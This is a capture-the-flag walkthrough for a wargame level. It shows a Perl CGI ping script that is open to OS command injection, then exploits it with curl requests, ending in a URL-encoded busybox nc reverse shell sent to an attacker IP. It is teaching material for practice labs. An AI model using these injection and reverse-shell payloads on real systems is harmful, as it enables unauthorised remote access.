# username / password
level07 / level07
# goal
* The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.
* To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.
```
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```
# concept
* OS command injection
* Perl programming
# method of solve
* according to the source code, the page run the `ping` command on whatever host is provided in the `Host` URL parameter
* there's a file at the following endpoint `/home/flag07/thttpd.conf`, which specifies that the port used by the app is `7007`
* when we check the networking port status on the system, we see that port 7007 is open and listening, but there's no convenient programs on the system like `curl`
* when we scan the system from the outside with `nmap`, we see that port 7007 is open, so we can `curl` from our Attacker machine to access the app:
```
curl http://10.0.2.107:7007/index.cgi
```
* the app is online, but we're missing the `Host` url parameter
```
curl 'http://10.0.2.107:7007/index.cgi?Host=localhost'
```
* this gives us ping output, and the script is using Linux OS commands, which we can test for OS command injection
```
curl 'http://10.0.2.107:7007/index.cgi?Host=%3B%20whoami'
```
Note that we need to URL encode the payload for it to go through
* to get access to the flag07 account, we'll have the app make a reverse shell connection to our attacker machine:
```
curl http://10.0.2.107:7007/index.cgi?Host='%3Bbusybox%20nc%2010.0.2.88%20443%20-e%20bash''
```
Note that this is the URL-encoded version of this payload `;busybox nc 10.0.2.88 443 -e bash`
